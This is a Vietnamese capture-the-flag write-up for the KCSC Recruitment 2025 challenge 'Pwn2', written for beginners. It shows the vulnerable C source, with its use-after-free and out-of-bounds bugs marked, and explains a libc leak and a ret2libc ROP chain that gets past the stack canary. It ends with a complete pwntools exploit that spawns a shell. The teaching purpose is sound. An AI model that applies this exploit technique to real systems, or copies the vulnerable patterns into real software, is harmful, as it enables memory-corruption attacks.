# Pwn2---Write-up-----KCSC Recruitment 2025
Hướng dẫn cách giải bài Pwn2 cho anh em mới chơi pwnable.

**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 10/8/2026

## 1. Mục tiêu
Bài này là 1 bài kết hợp giữa **Heap** và **OOB**, đầu tiên là đọc code

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>

char *review[5];
int size[5];
void writereview()
{
    unsigned int movie = 0;
    puts("\nHow many movie you want to write review(max is 5 though)");
    scanf("%d",&movie);
    if(movie <= 5) 
    {
        for(int i =0 ;i<movie;i++)
        {
            puts("how long is your review?");
            scanf("%d",&size[i]);
            review[i] = (char*) malloc(size[i]);
            puts("Give us some of your thought on the movie!!!");
            read(0,review[i],size[i] - 1);
        }

    }    
}
void removeReview()
{
    unsigned int i;
    puts("\nwhich review you want to remove??");
    scanf("%u",&i);
    if(i<5 && review[i])
    {
        free(review[i]);        // Lỗi Use After Free
    }
}


void ReviewTheReview()
{
    unsigned int i ;
    puts("Which review you want to look back!!!!");
    scanf("%u",&i);
    if(i<5)
    {
        puts(review[i]);
    }
}

void timeout() {
    puts("Timeout");
    exit(1);
}

void setup() {
    signal(0xe,&timeout);
    alarm(60);
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
}

int main()
{
    setup();
    int option;
    int n_guest;
    unsigned int lucky_index;
    unsigned long lucky[10];
    puts("\nWELCOME TO KCSC LETTERBOXD MINI PROGRAM!");
    while(1)
    {
        puts("\nwhat do you like to do?");
        scanf("%d",&option);
        switch(option)
        {
            case 1:
                writereview();
                break;
            case 2:
                ReviewTheReview();
                break ;
            case 3:
                removeReview();
                break;
            case 4:
                puts("\nTHIS IS JUST A MINI GAME , THE PRIZE IS NOTHING BUT THE CONTENT OF SOME FLAG\n");
                puts("\nHOW MANY NUMBER YOU WANT TO BET?(max is 10 tho)");
                scanf("%d",&n_guest);
                if(n_guest <= 10)
                {
                    for(int i = 0;i < n_guest;i++)
                    {
                        scanf("%ld",&lucky[lucky_index++]);      // OOB
                    }
                }
                break;
            case 5:
                puts("bye bye");
                return 0;
            default:
                puts("\nnothing here!!");
        }

    }
}

```

Đầu tiên là lỗi **UAF**, khi free thì nó không set con trỏ tới chunk thành null. Từ đó ta có thể sử dụng `ReviewTheReview()` để leak được libc từ việc free 1 chunk lớn.

Tiếp theo là lỗi **OOB**, khi kích hoạt menu 4 thì nó cho ta nhập số nguyên vào trong vị trí của `lucky`, nhưng khi hết vòng lặp thì nó không reset lại `lucky_index` mà vẫn giữ nguyên. Nên khi ở vòng lặp tiếp theo thì ta sẽ bắt đầu ghi vào vị trí `lucky + 1`, từ đó ghi được vào RIP và ret2libc.

## 2. Cách thực thi
Đầu tiên là leak libc, ta cần tạo 1 chunk siêu lớn > 0x400 để khi free nó rơi vào `unsortbin` và 1 chunk nhỏ để chặn lại không cho chunk kia bị gộp vào.

```Python
p.sendlineafter(b'what do you like to do?', b'1')
p.sendlineafter(b'How many movie you want to write review(max is 5 though)', b'2')

p.sendlineafter(b'how long is your review?', b'2000')
p.sendafter(b'Give us some of your thought on the movie!!!', b'AAAA')

p.sendlineafter(b'how long is your review?', b'20')
p.sendafter(b'Give us some of your thought on the movie!!!', b'BBBB')

p.sendlineafter(b'what do you like to do?', b'3')
p.sendlineafter(b'which review you want to remove??', b'0')

p.sendlineafter(b'what do you like to do?', b'2')
p.sendlineafter(b'Which review you want to look back!!!!', b'0')

p.recv(1)
leak_libc = u64(p.recv(6) + b'\x00\x00')
log.success(f'Leak Libc : {hex(leak_libc)}')
libc.address = leak_libc - 0x219ce0
log.success(f'Libc base : {hex(libc.address)}')
```

<img width="698" height="75" alt="image" src="https://github.com/user-attachments/assets/ee29548d-075d-4739-ab95-2251480a6a7f" />

Sau khi có leak thì ta sẽ chuẩn bị các ROPchain gồm : `ret`, `pop rdi`, `bin/sh` và `system`. Vì bài này có canary nên ở vị trí canary chúng ta chỉ cần nhập dấu `+` thay dấu `-` là nó sẽ skip qua và nhập tiếp các vị trí sau.

```Python
p.sendlineafter(b'what do you like to do?', b'4')
p.sendlineafter(b'HOW MANY NUMBER YOU WANT TO BET?(max is 10 tho)', b'10')

for i in range(0,10):
    p.sendline(str(i).encode())

p.sendlineafter(b'what do you like to do?', b'4')
p.sendlineafter(b'HOW MANY NUMBER YOU WANT TO BET?(max is 10 tho)', b'6')
p.sendline(b'+')
p.sendline(str(0).encode())

pop_rdi    = libc.address + 0x2a3e5
ret        = libc.address + 0x29139
system     = libc.sym['system']
binsh_addr = next(libc.search(b'/bin/sh\x00'))

p.sendline(str(pop_rdi).encode())
p.sendline(str(binsh_addr).encode())
p.sendline(str(ret).encode())
p.sendline(str(system).encode())

p.sendlineafter(b'what do you like to do?', b'5')
```

<img width="995" height="417" alt="image" src="https://github.com/user-attachments/assets/3310a855-5cc3-4e1e-81c2-8eef9ae18c41" />

Giờ chỉ việc gọi menu 5 và get shell thôi 🐧.

## 3. Exploit
```Python
from pwn import *

exe = ELF("pwn2_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process('./pwn2_patched')

p.sendlineafter(b'what do you like to do?', b'1')
p.sendlineafter(b'How many movie you want to write review(max is 5 though)', b'2')

p.sendlineafter(b'how long is your review?', b'2000')
p.sendafter(b'Give us some of your thought on the movie!!!', b'AAAA')

p.sendlineafter(b'how long is your review?', b'20')
p.sendafter(b'Give us some of your thought on the movie!!!', b'BBBB')

p.sendlineafter(b'what do you like to do?', b'3')
p.sendlineafter(b'which review you want to remove??', b'0')

p.sendlineafter(b'what do you like to do?', b'2')
p.sendlineafter(b'Which review you want to look back!!!!', b'0')

p.recv(1)
leak_libc = u64(p.recv(6) + b'\x00\x00')
log.success(f'Leak Libc : {hex(leak_libc)}')
libc.address = leak_libc - 0x219ce0
log.success(f'Libc base : {hex(libc.address)}')

p.sendlineafter(b'what do you like to do?', b'4')
p.sendlineafter(b'HOW MANY NUMBER YOU WANT TO BET?(max is 10 tho)', b'10')

for i in range(0,10):
    p.sendline(str(i).encode())

p.sendlineafter(b'what do you like to do?', b'4')
p.sendlineafter(b'HOW MANY NUMBER YOU WANT TO BET?(max is 10 tho)', b'6')
p.sendline(b'+')
p.sendline(str(0).encode())

pop_rdi    = libc.address + 0x2a3e5
ret        = libc.address + 0x29139
system     = libc.sym['system']
binsh_addr = next(libc.search(b'/bin/sh\x00'))

p.sendline(str(pop_rdi).encode())
p.sendline(str(binsh_addr).encode())
p.sendline(str(ret).encode())
p.sendline(str(system).encode())

p.sendlineafter(b'what do you like to do?', b'5')

p.interactive()
```
